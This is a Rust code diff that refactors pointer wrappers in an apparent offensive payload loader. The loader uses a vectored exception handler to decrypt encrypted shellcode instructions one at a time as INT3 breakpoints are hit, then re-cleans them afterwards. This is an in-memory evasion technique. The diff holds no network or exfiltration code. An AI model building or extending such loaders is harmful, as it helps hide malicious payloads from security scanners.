@@ -9,11 +9,17 @@ use crate::utils::{log_program_fail};
 pub const ASM_INT3: u8 = 0xcc;
 const MZ_HEADER: [u8; 2] = [b'M', b'Z'];
 
-// Global state
-static PAYLOAD_EXECUTED_ASM: Mutex<Option<*const IndexMap<u32, Vec<u8>>>> = Mutex::new(None);
-static ENCRYPTION_KEY: Mutex<Option<*const Vec<u8>>> = Mutex::new(None);
-static PAYLOAD_LOWER_BOUND: Mutex<Option<*const u8>> = Mutex::new(None);
-static PAYLOAD_UPPER_BOUND: Mutex<Option<*const u8>> = Mutex::new(None);
+// Global state - we use raw pointers which are not Send/Sync by default
+// We manually implement Send/Sync through wrapper types since we control access
+#[derive(Clone, Copy)]
+struct SendPtr<T>(*const T);
+unsafe impl<T> Send for SendPtr<T> {}
+unsafe impl<T> Sync for SendPtr<T> {}
+
+static PAYLOAD_EXECUTED_ASM: Mutex<Option<SendPtr<IndexMap<u32, Vec<u8>>>>> = Mutex::new(None);
+static ENCRYPTION_KEY: Mutex<Option<SendPtr<Vec<u8>>>> = Mutex::new(None);
+static PAYLOAD_LOWER_BOUND: Mutex<Option<SendPtr<u8>>> = Mutex::new(None);
+static PAYLOAD_UPPER_BOUND: Mutex<Option<SendPtr<u8>>> = Mutex::new(None);
 static ASM_CLEAN_QUEUE: Mutex<Vec<(u32, u32)>> = Mutex::new(Vec::new());
 
 /// Initialize global state for VEH
@@ -23,23 +29,23 @@ pub unsafe fn init_veh_globals(
     lower_bound: *const u8,
     upper_bound: *const u8,
 ) {
-    *PAYLOAD_EXECUTED_ASM.lock().unwrap() = Some(asm_map);
-    *ENCRYPTION_KEY.lock().unwrap() = Some(key);
-    *PAYLOAD_LOWER_BOUND.lock().unwrap() = Some(lower_bound);
-    *PAYLOAD_UPPER_BOUND.lock().unwrap() = Some(upper_bound);
+    *PAYLOAD_EXECUTED_ASM.lock().unwrap() = Some(SendPtr(asm_map));
+    *ENCRYPTION_KEY.lock().unwrap() = Some(SendPtr(key));
+    *PAYLOAD_LOWER_BOUND.lock().unwrap() = Some(SendPtr(lower_bound));
+    *PAYLOAD_UPPER_BOUND.lock().unwrap() = Some(SendPtr(upper_bound));
 }
 
 /// Check if an exception occurred within our payload
 unsafe fn exception_happened_in_our_payload(exception_address: *const u8) -> bool {
-    let lower = (*PAYLOAD_LOWER_BOUND.lock().unwrap()).unwrap();
-    let upper = (*PAYLOAD_UPPER_BOUND.lock().unwrap()).unwrap();
+    let lower = (*PAYLOAD_LOWER_BOUND.lock().unwrap()).unwrap().0;
+    let upper = (*PAYLOAD_UPPER_BOUND.lock().unwrap()).unwrap().0;
 
     exception_address >= lower && exception_address <= upper
 }
 
 /// Calculate offset from payload base address
 unsafe fn find_rip_offset_from_payload_base(rip: u64) -> u32 {
-    let lower = (*PAYLOAD_LOWER_BOUND.lock().unwrap()).unwrap() as u64;
+    let lower = (*PAYLOAD_LOWER_BOUND.lock().unwrap()).unwrap().0 as u64;
     (rip - lower) as u32
 }
 
@@ -63,7 +69,7 @@ pub unsafe extern "system" fn veh_payload(exception_info: *mut EXCEPTION_POINTER
         {
             let mut queue = ASM_CLEAN_QUEUE.lock().unwrap();
             if !queue.is_empty() {
-                let lower = (*PAYLOAD_LOWER_BOUND.lock().unwrap()).unwrap() as *mut u8;
+                let lower = (*PAYLOAD_LOWER_BOUND.lock().unwrap()).unwrap().0 as *mut u8;
 
                 for (asm_offset, asm_len) in queue.iter() {
                     let asm_addr = lower.add(*asm_offset as usize);
@@ -78,7 +84,7 @@ pub unsafe extern "system" fn veh_payload(exception_info: *mut EXCEPTION_POINTER
         let asm_offset = find_rip_offset_from_payload_base((*context).Rip);
 
         // Get the instruction from the map
-        let map_ptr = (*PAYLOAD_EXECUTED_ASM.lock().unwrap()).unwrap();
+        let map_ptr = (*PAYLOAD_EXECUTED_ASM.lock().unwrap()).unwrap().0;
         let payload_executed_asm = &*map_ptr;
 
         let Some(encrypted_asm) = payload_executed_asm.get(&asm_offset) else {
@@ -88,7 +94,7 @@ pub unsafe extern "system" fn veh_payload(exception_info: *mut EXCEPTION_POINTER
         };
 
         // Decrypt and write the instruction
-        let key_ptr = (*ENCRYPTION_KEY.lock().unwrap()).unwrap();
+        let key_ptr = (*ENCRYPTION_KEY.lock().unwrap()).unwrap().0;
         let encryption_key = &*key_ptr;
 
         let asm_addr = (*context).Rip as *mut u8;
